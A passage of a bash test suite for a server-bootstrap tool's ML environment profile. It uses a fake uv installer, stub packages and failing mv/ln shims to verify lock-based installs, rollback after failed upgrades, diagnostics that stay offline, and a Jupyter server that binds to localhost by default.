cat > "$MLI/templates/spacy/__init__.py" <<'PY'
import re
from . import util


class _Token:
    def __init__(self, text):
        self.text = text


def blank(lang):
    return lambda text: [_Token(piece) for piece in re.findall(r"\w+|[^\w\s]", text)]
PY
printf 'import os\n\n\ndef get_installed_models():\n    return [m for m in os.environ.get("FAKE_SPACY_MODELS", "").split(",") if m]\n' \
    > "$MLI/templates/spacy/util.py"
printf 'import os\nHF_HUB_OFFLINE = os.environ.get("HF_HUB_OFFLINE") == "1"\n' > "$MLI/templates/huggingface_hub/constants.py"
: > "$MLI/templates/huggingface_hub/__init__.py"
cat > "$MLI/build-site.py" <<'PY'
# Writes one importable module and one dist-info per pin of a lock.
import os, re, shutil, sys
lock, site, bindir, templates = sys.argv[1:5]
IMPORT = {"scikit-learn": "sklearn", "pillow": "PIL", "opencv-python-headless": "cv2",
          "jupyter-client": "jupyter_client"}
pins = []
for line in open(lock):
    match = re.match(r"^([A-Za-z0-9][A-Za-z0-9._-]*)==(\S+)", line)
    if match:
        pins.append((match.group(1).lower(), match.group(2)))
for name, version in pins:
    module = IMPORT.get(name, re.sub(r"[-.]", "_", name))
    package = os.path.join(site, module)
    if os.path.isdir(os.path.join(templates, module)):
        shutil.copytree(os.path.join(templates, module), package)
    os.makedirs(package, exist_ok=True)
    init = os.path.join(package, "__init__.py")
    body = open(init).read() if os.path.exists(init) else ""
    if module == "torch" and os.environ.get("FAKE_UV_BREAK_TORCH") == "1":
        body = "raise ImportError('simulated broken native library')\n"
    if module == "ipywidgets":
        body += ("import os\nopen(os.environ['FAKE_ENV_RECORD'], 'w').write("
                 "' '.join(k + '=' + os.environ.get(k, '') for k in ('HF_HUB_OFFLINE', 'HF_DATASETS_OFFLINE', "
                 "'TRANSFORMERS_OFFLINE'))) if os.environ.get('FAKE_ENV_RECORD') else None\n")
    with open(init, "w") as handle:
        handle.write(f"__version__ = {version!r}\n" + body)
    info = os.path.join(site, f"{name.replace('-', '_')}-{version}.dist-info")
    os.makedirs(info, exist_ok=True)
    with open(os.path.join(info, "METADATA"), "w") as handle:
        handle.write(f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n")
    if name == "jupyterlab":
        with open(os.path.join(bindir, "jupyter"), "w") as handle:
            handle.write('#!/bin/sh\nprintf "%s\\n" "$@" > "${FAKE_JUPYTER_ARGS:-' + site + '/.jupyter-started}"\n')
        os.chmod(os.path.join(bindir, "jupyter"), 0o755)
with open(os.path.join(site, ".pins"), "w") as handle:
    handle.write("".join(f"{name}=={version}\n" for name, version in pins))
PY
cat > "$MLI/bin/uv" <<'FAKEUV'
#!/usr/bin/env bash
# Stand-in uv: records each call, builds from the lock, never touches a network.
set -e
printf '%s\n' "$*" >> "$FAKE_UV_LOG"
printf 'env UV_EXTRA_INDEX_URL=%s UV_INDEX_STRATEGY=%s UV_TORCH_BACKEND=%s\n' "${UV_EXTRA_INDEX_URL-unset}" \
    "${UV_INDEX_STRATEGY-unset}" "${UV_TORCH_BACKEND-unset}" >> "$FAKE_UV_LOG"
case "$1" in
    --version) echo "uv 0.0.0"; exit 0 ;;
    venv)
        dir="${*: -1}"
        mkdir -p "$dir/bin" "$dir/lib/site"
        printf '#!/bin/sh\nPYTHONPATH="%s/lib/site" exec "%s" -S "$@"\n' "$dir" "$FAKE_UV_PYTHON" > "$dir/bin/python"
        chmod 0755 "$dir/bin/python"; exit 0 ;;
    pip)
        sub="$2"; shift 2; python=""; lock=""
        while (( $# )); do case "$1" in --python) python="$2"; shift 2 ;; --torch-backend) shift 2 ;; --*) shift ;; *) lock="$1"; shift ;; esac; done
        site="$(dirname -- "$python")/../lib/site"
        case "$sub" in
            freeze) cat -- "$site/.pins" 2>/dev/null; exit 0 ;;
            sync)
                [[ "${FAKE_UV_SYNC_FAIL:-0}" != 1 ]] || { echo "error: simulated download failure" >&2; exit 1; }
                rm -rf -- "$site"; mkdir -p -- "$site"
                "$FAKE_UV_PYTHON" "$FAKE_UV_BUILDER" "$lock" "$site" "$(dirname -- "$python")" "$FAKE_UV_TEMPLATES"
                exit 0 ;;
        esac ;;
esac
echo "fake uv: unsupported: $*" >&2; exit 2
FAKEUV
chmod 0755 "$MLI/bin/uv"
ml_fixture_lock "$MLI/locks/cpu-$ML_ARCH.txt" cpu "$ML_ARCH" none https://download.pytorch.org/whl/cpu
ml_fixture_lock "$MLI/locks/cu130-$ML_ARCH.txt" cu130 "$ML_ARCH" 13.0 https://download.pytorch.org/whl/cu130
MLW="$MLI/ws"
ml_env() {  # run with the stand-ins and this test's workspace
    env PATH="$MLI/bin:$PATH" WORKSPACE_ROOT="$MLW" ML_LOCK_DIR="$MLI/locks" ML_SYSFS_ROOT="$MLS/sys-empty" \
        ML_NVIDIA_SMI="$MLS/absent/nvidia-smi" \
        ML_PYTHON="$ML_PY312" ML_UV="$MLI/bin/uv" ML_BIN_DIR="$MLI/usr-bin" ML_MIN_FREE_GB=0 \
        FAKE_UV_LOG="$MLI/uv.log" FAKE_UV_PYTHON="$ML_PY312" FAKE_UV_BUILDER="$MLI/build-site.py" \
        FAKE_UV_TEMPLATES="$MLI/templates" "$@"
}
ml_install() {  # [NAME=VALUE...] [installer arguments...]
    local -a assignments=()
    while [[ "${1:-}" =~ ^[A-Z_]+= ]]; do assignments+=("$1"); shift; done
    ml_env "${assignments[@]}" ./server-profile install ml "$@" >"$MLI/out" 2>&1
}
ML_STATE="$MLW/.setup-state/profiles/ml"
ML_LINK="$MLW/venvs/ml-workbench"
declared_version="$(tr -d '[:space:]' < VERSION)"

ml_env ./profiles/ml/bin/ml-status >"$MLI/status" 2>&1
[[ $? == 1 ]] && grep -q 'not installed' "$MLI/status" \
    && ok "ml-status reports a profile that is not installed, and exits 1" || bad "ml-status before install"

: > "$MLI/uv.log"
if ml_install UV_EXTRA_INDEX_URL=https://mirror.invalid/simple UV_INDEX_STRATEGY=unsafe-best-match UV_TORCH_BACKEND=cu999 \
    --backend auto; then ok "first install succeeds"; else bad "first install: $(cat "$MLI/out")"; fi
first_target="$(readlink -- "$ML_LINK" 2>/dev/null)"
[[ -L "$ML_LINK" && "$first_target" == "$MLW/venvs/.ml-workbench/cpu-"* && -x "$ML_LINK/bin/python" ]] \
    && ok "the environment is reached at venvs/ml-workbench, a link to one built environment" \
    || bad "environment layout: $first_target"
grep -q -- "^venv --python $ML_PY312 --no-python-downloads" "$MLI/uv.log" \
    && grep -q -- '^pip sync .*--require-hashes --no-build .*--torch-backend cpu '"$MLI/locks/cpu-$ML_ARCH.txt"'$' "$MLI/uv.log" \
    && ok "the environment is built from Python 3.12 and synced from the lock with hashes required, torch routed by backend" \
    || bad "install commands: $(cat "$MLI/uv.log")"
[[ "$(grep '^env ' "$MLI/uv.log" | sort -u)" == 'env UV_EXTRA_INDEX_URL=unset UV_INDEX_STRATEGY=unset UV_TORCH_BACKEND=unset' ]] \
    && ok "the caller's uv index, strategy and backend settings never reach the build" \
    || bad "uv saw the caller's index settings: $(grep '^env ' "$MLI/uv.log" | sort -u)"
state_ok=1
[[ "$(cat "$ML_STATE/repository-version")" == "$declared_version" ]] || { bad "state: repository-version"; state_ok=0; }
[[ "$(cat "$ML_STATE/backend")" == cpu && "$(cat "$ML_STATE/cuda")" == none ]] || { bad "state: backend"; state_ok=0; }
[[ "$(cat "$ML_STATE/lock")" == "cpu-$ML_ARCH.txt" ]] || { bad "state: lock name"; state_ok=0; }
[[ "$(cat "$ML_STATE/lock-sha256")" == "$(sha256sum "$MLI/locks/cpu-$ML_ARCH.txt" | cut -c1-64)" ]] \
    || { bad "state: lock digest"; state_ok=0; }
[[ "$(cat "$ML_STATE/environment")" == "$first_target" ]] || { bad "state: environment"; state_ok=0; }
[[ "$(sed 's/==.*//' "$ML_STATE/core-versions" | tr '\n' ' ')" == 'python torch torchvision numpy ' ]] \
    && grep -qx 'torch==2.14.0+cpu' "$ML_STATE/core-versions" && grep -qx 'numpy==2.3.1' "$ML_STATE/core-versions" \
    && grep -qx 'python==3.12.[0-9]*' "$ML_STATE/core-versions" \
    || { bad "state: core versions: $(tr '\n' ' ' < "$ML_STATE/core-versions")"; state_ok=0; }
(( state_ok )) && ok "state records repository version, backend, lock digest, environment and core versions"
owner_ok=1
while IFS= read -r -d '' file; do
    [[ "$(stat -c '%u' "$file")" == "$(id -u)" ]] || owner_ok=0
    (( ( 8#$(stat -c '%a' "$file") & 8#022 ) == 0 )) || owner_ok=0
done < <(find "$ML_STATE" -print0)
[[ "$ML_STATE" == "$MLW/.setup-state/profiles/ml" && ! -e "$MLW/.setup-state/bundles" ]] || owner_ok=0
(( owner_ok )) && ok "profile state is owned by the installing user, not group or world writable, and apart from bundle state" \
    || bad "profile state ownership or modes"
links_ok=1
for command in ml-env ml-status ml-doctor ml-preflight ml-jupyter; do
    [[ "$(readlink -- "$MLI/usr-bin/$command")" == "$ROOT/profiles/ml/bin/$command" ]] || links_ok=0
done
(( links_ok )) && ok "the five ml commands are linked once the profile is installed" || bad "ml command links"
[[ ! -e "$ML_LINK/lib/site/.jupyter-started" ]] && ok "installation starts no Jupyter server" \
    || bad "Jupyter ran during installation"

: > "$MLI/uv.log"; first_installed_at="$(cat "$ML_STATE/installed-at")"
if ml_install --backend auto && grep -q 'nothing to rebuild' "$MLI/out" \
    && [[ "$(readlink -- "$ML_LINK")" == "$first_target" && "$(cat "$ML_STATE/installed-at")" == "$first_installed_at" ]] \
    && ! grep -qE '^(venv|pip sync)' "$MLI/uv.log"; then
    ok "an identical reinstall keeps the same environment and builds nothing"
else
    bad "identical reinstall: $(cat "$MLI/out")"
fi
ml_env ./server-profile install ml --dry-run >"$MLI/out" 2>&1 && grep -q 'plan: keep backend cpu' "$MLI/out" \
    && ok "a dry run on an installed host reports that it would keep the environment" || bad "dry run after install"

: > "$MLI/uv.log"
if ! ml_install --backend cu130 && grep -q 'rerun with --reconfigure' "$MLI/out" \
    && [[ "$(readlink -- "$ML_LINK")" == "$first_target" && "$(cat "$ML_STATE/backend")" == cpu ]] \
    && ! grep -q '^venv' "$MLI/uv.log"; then
    ok "a backend change without --reconfigure is refused and changes nothing"
else
    bad "unrequested backend change: $(cat "$MLI/out")"
fi
if ml_install --backend cu130 --reconfigure && [[ "$(cat "$ML_STATE/backend")" == cu130 ]]; then
    second_target="$(readlink -- "$ML_LINK")"
    [[ "$second_target" == "$MLW/venvs/.ml-workbench/cu130-"* && ! -e "$first_target" \
        && "$(ls "$MLW/venvs/.ml-workbench")" == "$(basename -- "$second_target")" ]] \
        && ok "--reconfigure switches the backend and removes the replaced environment" \
        || bad "reconfigure layout: $(ls "$MLW/venvs/.ml-workbench")"
else
    bad "reconfigure: $(cat "$MLI/out")"
fi

# A failed upgrade: the shipped lock changes, and the new build fails at the
# download and then at verification. Neither may touch what is installed.
second_target="$(readlink -- "$ML_LINK")"; state_before="$(cat "$ML_STATE"/* | sha256sum)"
ml_fixture_lock "$MLI/locks/cu130-$ML_ARCH.txt" cu130 "$ML_ARCH" 13.0 https://download.pytorch.org/whl/cu130 \
    +cu130 tqdm=4.67.1
for failure in FAKE_UV_SYNC_FAIL=1 FAKE_UV_BREAK_TORCH=1; do
    if ! ml_install "$failure" --backend cu130 && grep -q 'previous environment is unchanged' "$MLI/out" \
        && [[ "$(readlink -- "$ML_LINK")" == "$second_target" && "$(cat "$ML_STATE"/* | sha256sum)" == "$state_before" \
            && "$(ls "$MLW/venvs/.ml-workbench")" == "$(basename -- "$second_target")" ]] \
        && [[ "$(ml_env ./profiles/ml/bin/ml-env python -c 'import torch; print(torch.__version__)')" == 2.14.0+cu130 ]]; then
        ok "a failed upgrade ($failure) leaves the previous environment, state and commands usable"
    else
        bad "failed upgrade ($failure): $(cat "$MLI/out")"
    fi
done
# A failure after the switch, while the state or the command links are written:
# the link, the state and the commands go back to what they were. Stand-in mv
# and ln fail just those writes; everything else passes through.
MLF="$MLI/fail-after-switch"; mkdir -p "$MLF/mv" "$MLF/ln" "$MLF/kill"
printf '#!/bin/sh\nfor a in "$@"; do case "$a" in */profiles/ml/core-versions) echo "mv: simulated failure" >&2; exit 1 ;; esac; done\nexec mv "$@"\n' \
    | sed "s#exec mv#exec $(command -v mv)#" > "$MLF/mv/mv"
printf '#!/bin/sh\nfor a in "$@"; do case "$a" in */usr-bin/ml-*|*/bin-first/ml-*) echo "ln: simulated failure" >&2; exit 1 ;; esac; done\nexec ln "$@"\n' \
    | sed "s#exec ln#exec $(command -v ln)#" > "$MLF/ln/ln"
printf '#!/bin/sh\nfor a in "$@"; do case "$a" in */profiles/ml/core-versions) kill -KILL "$PPID"; exit 1 ;; esac; done\nexec mv "$@"\n' \
    | sed "s#exec mv#exec $(command -v mv)#" > "$MLF/kill/mv"
chmod 0755 "$MLF/mv/mv" "$MLF/ln/ln" "$MLF/kill/mv"
command_links() { for command in ml-env ml-status ml-doctor ml-preflight ml-jupyter; do readlink -- "$MLI/usr-bin/$command"; done; }
links_before="$(command_links)"
for failure in "mv --backend cu130" "ln --backend cpu --reconfigure"; do
    read -r shim args <<< "$failure"
    # shellcheck disable=SC2086  # $args is a fixed list of installer options
    if ! ml_install PATH="$MLF/$shim:$MLI/bin:$PATH" $args \
        && grep -q 'failed after the switch; the previous environment, its state and commands were restored' "$MLI/out" \
        && [[ "$(readlink -- "$ML_LINK")" == "$second_target" && "$(cat "$ML_STATE"/* | sha256sum)" == "$state_before" \
            && "$(ls -A "$MLW/venvs/.ml-workbench")" == "$(basename -- "$second_target")" \
            && "$(command_links)" == "$links_before" \
            && -z "$(find "$MLW/venvs" -mindepth 1 -maxdepth 1 ! -name ml-workbench ! -name .ml-workbench)" \
            && -z "$(find "$ML_STATE" -mindepth 1 -maxdepth 1 -name '.*')" ]] \
        && [[ "$(ml_env ./profiles/ml/bin/ml-env python -c 'import torch; print(torch.__version__)')" == 2.14.0+cu130 ]]; then
        ok "a failure after the switch ($shim fails, install $args) restores the previous environment, state and commands"
    else
        bad "failure after the switch ($shim ${args}): $(cat "$MLI/out"); link $(readlink -- "$ML_LINK")"
    fi
done
# First install: after a failure nothing is left installed.
MLW1="$MLI/ws-first"
if ! ml_install PATH="$MLF/mv:$MLI/bin:$PATH" WORKSPACE_ROOT="$MLW1" ML_BIN_DIR="$MLI/bin-first" --backend cpu \
    && grep -q 'failed after the switch; the new environment, its state and commands were removed' "$MLI/out" \
    && [[ ! -e "$MLW1/venvs/ml-workbench" && ! -L "$MLW1/venvs/ml-workbench" && -z "$(ls -A "$MLW1/venvs/.ml-workbench")" \
        && ! -e "$MLW1/.setup-state/profiles/ml" && -z "$(ls -A "$MLI/bin-first" 2>/dev/null)" ]] \
    && ! ml_env WORKSPACE_ROOT="$MLW1" ./profiles/ml/bin/ml-status >/dev/null 2>&1; then
    ok "a failure after the switch on a first install leaves no environment, state or command"
else
    bad "first install failing after the switch: $(cat "$MLI/out"); $(find "$MLW1" "$MLI/bin-first" -mindepth 1 2>/dev/null)"
fi
ml_env ./profiles/ml/bin/ml-status >"$MLI/status" 2>&1
grep -q 'differs from this release' "$MLI/status" \
    && ok "ml-status says when the shipped lock differs from the installed one" || bad "ml-status lock drift"
# A run killed after the switch cannot restore anything itself. The state then
# still names the previous environment, so the next run rebuilds rather than
# keeping, and clears what the killed run left. Its own temporary files stay
# in this suite's directory.
mkdir -p "$MLF/tmp"
ml_install TMPDIR="$MLF/tmp" PATH="$MLF/kill:$MLI/bin:$PATH" --backend cu130
killed_link="$(readlink -- "$ML_LINK")"
if [[ "$killed_link" != "$second_target" && "$(cat "$ML_STATE/environment")" == "$second_target" ]] \
    && ls -d "$MLW/.setup-state/profiles/".ml-state-previous.* >/dev/null 2>&1 \
    && ! ml_env ./profiles/ml/bin/ml-status >/dev/null 2>&1; then
    ok "a run killed after the switch leaves the link and the recorded environment disagreeing, which ml-status reports"
else
    bad "killed run: link $killed_link, recorded $(cat "$ML_STATE/environment")"
fi
if ml_install --backend cu130 && ! grep -q 'nothing to rebuild' "$MLI/out" && grep -qx 'tqdm==4.67.1' "$ML_STATE/packages" \
    && [[ "$(readlink -- "$ML_LINK")" != "$second_target" && "$(readlink -f -- "$ML_LINK")" == "$(cat "$ML_STATE/environment")" ]] \
    && ! ls -d "$MLW/.setup-state/profiles/".ml-state-previous.* "$ML_STATE"/.state.* "$ML_LINK".switch.* >/dev/null 2>&1 \
    && [[ "$(ls -A "$MLW/venvs/.ml-workbench" | wc -l)" == 1 ]]; then
    ok "once the failure is gone, the same command upgrades to the new lock and clears what a killed run left"
else
    bad "upgrade after a failure: $(cat "$MLI/out")"
fi
forced_from="$(readlink -- "$ML_LINK")"
ml_install --backend cu130 --force && [[ "$(readlink -- "$ML_LINK")" != "$forced_from" && ! -e "$forced_from" ]] \
    && ok "--force rebuilds an up-to-date environment" || bad "--force: $(cat "$MLI/out")"

section "ML profile: commands"
ml_env ./profiles/ml/bin/ml-status >"$MLI/status" 2>&1
[[ $? == 0 ]] && grep -q '^backend: *cu130 (CUDA 13.0)' "$MLI/status" && grep -q 'matches the lock this release ships' "$MLI/status" \
    && grep -q '^torch: *2.14.0+cu130' "$MLI/status" \
    && ok "ml-status reports the recorded backend, lock and core versions" || bad "ml-status: $(cat "$MLI/status")"
[[ "$(ml_env ./profiles/ml/bin/ml-env sh -c 'printf "%s %s" "$VIRTUAL_ENV" "${PATH%%:*}"')" == "$ML_LINK $ML_LINK/bin" ]] \
    && ok "ml-env runs a command with the environment active" || bad "ml-env"
ml_env ./profiles/ml/bin/ml-preflight >"$MLI/out" 2>&1 && grep -q 'PASS  backend: cpu' "$MLI/out" \
    && ok "ml-preflight reports what an installation would use" || bad "ml-preflight: $(cat "$MLI/out")"

# A CPU install for the diagnostics below.
ml_install --backend cpu --reconfigure || bad "reinstall cpu for diagnostics: $(cat "$MLI/out")"
HF_TEST_HOME="$MLI/hf-home"; mkdir -p "$HF_TEST_HOME"
ml_doctor() { ml_env HF_HOME="$HF_TEST_HOME" HF_HUB_OFFLINE=0 FAKE_ENV_RECORD="$MLI/env-record" "$@" \
    ./profiles/ml/bin/ml-doctor >"$MLI/doctor" 2>&1; }
if ml_doctor; then
    all_imports=1
    for pin in "${ML_PINS[@]}"; do
        [[ "${pin%%=*}" == jupyter-client ]] && continue
        grep -q "^PASS  import ${pin%%=*}: " "$MLI/doctor" || all_imports=0
    done
    (( all_imports )) && grep -q '^PASS  cpu tensor: ' "$MLI/doctor" && grep -q '^PASS  vision: ' "$MLI/doctor" \
        && grep -q '^PASS  notebook kernel: ' "$MLI/doctor" \
        && grep -q '^N/A   gpu: CPU backend on a host with no NVIDIA GPU' "$MLI/doctor" \
        && grep -q 'ml-doctor: [0-9]* passed, 0 failed, 0 skipped, 1 not applicable' "$MLI/doctor" \
        && ok "ml-doctor passes imports, a CPU tensor, a vision transform and kernel discovery; GPU is not applicable" \
        || bad "ml-doctor on a CPU host: $(cat "$MLI/doctor")"
else
    bad "ml-doctor failed on a healthy CPU environment: $(cat "$MLI/doctor")"
fi
[[ "$(cat "$MLI/env-record" 2>/dev/null)" == 'HF_HUB_OFFLINE=1 HF_DATASETS_OFFLINE=1 TRANSFORMERS_OFFLINE=1' \
    && -z "$(ls -A "$HF_TEST_HOME")" ]] \
    && ok "diagnostics force model and dataset downloads off and leave the cache empty" \
    || bad "diagnostics offline guard: $(cat "$MLI/env-record" 2>/dev/null)"
ml_env ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" ./profiles/ml/bin/ml-doctor 2>&1 \
    | grep -q '^SKIP  gpu: CPU backend installed; the NVIDIA GPU is not used or checked' \
    && ok "ml-doctor reports the GPU as skipped for a CPU backend on an NVIDIA host" || bad "ml-doctor skip on CPU backend"
ml_env HF_HOME="$HF_TEST_HOME" ./profiles/ml/bin/ml-doctor --json >"$MLI/doctor" 2>/dev/null && python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["summary"]["fail"] == 0 and d["checks"]' "$MLI/doctor" \
    && ok "ml-doctor --json emits the same checks as JSON" || bad "ml-doctor --json"
ml_doctor
language_ok=1
for check in 'language tokenizer' 'language model files' sentencepiece sacremoses datasets spacy 'hub offline' torchtext; do
    grep -q "^PASS  $check: " "$MLI/doctor" || language_ok=0
done
(( language_ok )) && ok "ml-doctor runs the language smoke checks on files it creates, and they pass" \
    || bad "ml-doctor language checks: $(grep -E 'language|sentencepiece|sacremoses|datasets|spacy|hub|torchtext' "$MLI/doctor")"
mkdir -p "$ML_LINK/lib/site/torchtext"; : > "$ML_LINK/lib/site/torchtext/__init__.py"
ml_doctor; tt_code=$?
rm -rf "$ML_LINK/lib/site/torchtext"
[[ "$tt_code" == 1 ]] && grep -q '^FAIL  torchtext: .*not part of the default profile' "$MLI/doctor" \
    && ok "ml-doctor fails when torchtext is present in the environment" || bad "torchtext detection (exit $tt_code)"
ml_doctor FAKE_SPACY_MODELS=en_core_web_sm; spacy_code=$?
[[ "$spacy_code" == 1 ]] && grep -q '^FAIL  spacy: .*a spaCy language model is installed: en_core_web_sm' "$MLI/doctor" \
    && ok "ml-doctor fails when a spaCy language model is installed" || bad "spaCy model detection (exit $spacy_code)"

ml_install --backend cu130 --reconfigure || bad "reinstall cu130 for diagnostics: $(cat "$MLI/out")"
gpu_case() {  # label, expected status line, exit (0|1), env assignments...
    local label="$1" line="$2" want="$3"
    shift 3
    ml_doctor FAKE_TORCH_BUILD_CUDA=13.0 "$@"
    local code=$?
    grep -q -- "$line" "$MLI/doctor" && [[ "$code" == "$want" ]] \
        && ok "ml-doctor: $label" || bad "ml-doctor: $label (exit $code): $(grep -iE 'gpu|build' "$MLI/doctor")"
}
gpu_case "a CUDA backend with no GPU on the host is skipped, not passed" \
    '^SKIP  gpu: no NVIDIA GPU on this host' 0
gpu_case "a working GPU passes an allocation and a matrix product" \
    '^PASS  gpu 0: Fake GPU (sm_86): allocation and 2x3 matrix product match the CPU result' 0 \
    ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" FAKE_TORCH_CUDA_DEVICES=1
gpu_case "a GPU torch cannot use fails" '^FAIL  gpu: torch cannot use the GPU' 1 \
    ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" FAKE_TORCH_CUDA_DEVICES=0
gpu_case "a device the build has no code for fails" '^FAIL  gpu 0: .*compute capability 7.5 is not in this build' 1 \
    ML_NVIDIA_SMI="$MLS/smi-13.0/nvidia-smi" FAKE_TORCH_CUDA_DEVICES=1 FAKE_TORCH_CAPABILITY=7.5
gpu_case "a CPU build of torch under a CUDA backend fails" '^FAIL  torch build: RuntimeError: backend expects CUDA 13.0' 1 \
    FAKE_TORCH_BUILD_CUDA=

JUPYTER_ARGS="$MLI/jupyter-args"
ml_env FAKE_JUPYTER_ARGS="$JUPYTER_ARGS" ./profiles/ml/bin/ml-jupyter >"$MLI/out" 2>&1
[[ "$(head -n 4 "$JUPYTER_ARGS" | tr '\n' ' ')" == 'lab --no-browser --ip=127.0.0.1 --port=8888 ' ]] \
    && ! grep -q WARNING "$MLI/out" \
    && ok "ml-jupyter runs JupyterLab on 127.0.0.1 without a browser by default" \
    || bad "ml-jupyter defaults: $(tr '\n' ' ' < "$JUPYTER_ARGS")"
ml_env FAKE_JUPYTER_ARGS="$JUPYTER_ARGS" ./profiles/ml/bin/ml-jupyter --ip 0.0.0.0 --port 9999 >"$MLI/out" 2>&1
grep -q 'WARNING: Jupyter will listen on 0.0.0.0' "$MLI/out" && [[ "$(tail -n 4 "$JUPYTER_ARGS" | tr '\n' ' ')" == '--ip 0.0.0.0 --port 9999 ' ]] \
    && ok "an explicit non-loopback address is passed through with a warning" || bad "ml-jupyter override"
ml_env FAKE_JUPYTER_ARGS="$JUPYTER_ARGS" ML_JUPYTER_IP=0.0.0.0 ./profiles/ml/bin/ml-jupyter >"$MLI/out" 2>&1
grep -q 'WARNING: Jupyter will listen on 0.0.0.0' "$MLI/out" && grep -qx -- '--ip=0.0.0.0' "$JUPYTER_ARGS" \
    && ok "ML_JUPYTER_IP changes the address, with the same warning" || bad "ML_JUPYTER_IP"
fi

section "ML profile: the foundation stays lightweight"
# The bootstrap copies profile files and installs the server-profile command,
# and nothing else: no environment, state or ml command exists until a plan or
# a person enables the profile.
grep -qE 'ml-(env|status|doctor|preflight|jupyter)|ml-workbench|profiles/ml' \
    server-bootstrap.sh lib/*.sh lib/bootstrap/*.sh \
    && bad "foundation code names the ml profile's environment, state or commands" \
    || ok "no foundation module creates the ml environment, its state or its commands"
grep -q 'find "$source_root/profiles" -type f' lib/bootstrap/runtime.sh \
    && grep -q 'ln -sfn "$destination/server-profile" /usr/local/bin/server-profile' lib/bootstrap/runtime.sh \
    && ok "the runtime installs the profile files and server-profile, not an environment" \
    || bad "runtime installation of profile files"
BW="$TMP/bundle-vs-profile"; mkdir -p "$BW"
if DEMO_MARK="$BW/mark" STATE_ROOT="$BW/ws/.setup-state" WORKSPACE_ROOT="$BW/ws" ./server-bundle-install \
    --name ml --version 1.0.0 --archive "$FIX/demo-1.0.0.tar.gz" --sha256-file "$FIX/demo.sha256" >/dev/null 2>&1 \
    && [[ -f "$BW/ws/.setup-state/bundles/ml/version" && ! -e "$BW/ws/.setup-state/profiles" && ! -e "$BW/ws/venvs" ]]; then
    ok "a bundle, even one named ml, neither creates nor records the ml profile"
else
    bad "bundle installation touched the ml profile's paths"
fi

section "Runtime installation of the new files"
for entry in 'server-secrets" "$stage/server-secrets' 'server-profile" "$stage/server-profile' \
    'lib/secrets-load.sh" "$stage/lib/secrets-load.sh' \
    'examples/secrets.env.example" "$stage/examples/secrets.env.example' \
    'examples/pi-models.example.json" "$stage/examples/pi-models.example.json'; do
    grep -qF -- "$entry" lib/bootstrap/runtime.sh \
        && ok "runtime installs $(printf '%s' "$entry" | cut -d'"' -f1)" \
        || bad "runtime.sh does not install $entry"
done
grep -q 'ln -sfn "$destination/server-secrets" /usr/local/bin/server-secrets' lib/bootstrap/runtime.sh \
    && ok "server-secrets is linked into PATH" || bad "server-secrets link"
grep -q 'ln -sfn "$destination/server-profile" /usr/local/bin/server-profile' lib/bootstrap/runtime.sh \
    && ok "server-profile is linked into PATH" || bad "server-profile link"
grep -q 'STEP=secrets; bootstrap_secrets' server-bootstrap.sh \
    && grep -q 'STEP=pi-config; bootstrap_pi_config' server-bootstrap.sh \
    && ok "the entrypoint runs the new steps" || bad "entrypoint wiring"

section "Fitness: shipped version strings match VERSION"
# 1.3.2 shipped headers still advertising 1.3.1 because config.example.env and
# checksums/*.txt are neither Markdown nor shell and were missed by a bump that
# only grepped those. A file may not claim a version that VERSION disagrees with.
# CHANGELOG.md and docs/TROUBLESHOOTING.md are excluded: they cite history.
declared="$(tr -d '[:space:]' < VERSION)"
version_drift=0
grep -q "BOOTSTRAP_VERSION=\"$declared\"" lib/bootstrap/config.sh \
    || { bad "BOOTSTRAP_VERSION does not match VERSION ($declared)"; version_drift=1; }
grep -qF "V=$declared" README.md \
    || { bad "README download snippet does not pin V=$declared"; version_drift=1; }
while IFS= read -r hit; do
    [[ -n "$hit" ]] || continue
    bad "stale version string: $hit"
    version_drift=1
done < <(grep -rnoE 'server-bootstrap[ -]v?[0-9]+\.[0-9]+\.[0-9]+' \
    README.md config.example.env checksums/*.txt docs/PROVISIONING.md examples/*.sh 2>/dev/null \
    | grep -vF "server-bootstrap $declared" \
    | grep -vF "server-bootstrap-$declared" || true)
(( version_drift == 0 )) && ok "shipped version strings match VERSION"

section "Results"
printf 'PASS: %d   FAIL: %d\n' "$PASS" "$FAIL"
# A stale manifest is the one failure here that is routine, mechanical, and not
# a defect in the change under test: a bot edits a tracked workflow file and
# cannot run the regeneration command. See #41. The message exists further up in
# release-files' own output, but the last line of a 300-assertion run is what
# anyone actually reads, so the remedy is repeated where it will be seen.
if (( MANIFEST_STALE )); then
    printf '\n%s\n' "----------------------------------------------------------------"
    printf 'checksums/SHA256SUMS is stale. Regenerate and commit it:\n\n'
    printf '    bash release/release-files.sh write\n\n'
    printf 'The workflow files are tracked, so they are part of the canonical\n'
    printf 'release set and the manifest covers them. This is not an\n'
    printf 'incompatibility in the change under test.\n'
    printf '%s\n' "----------------------------------------------------------------"
fi
(( FAIL == 0 ))
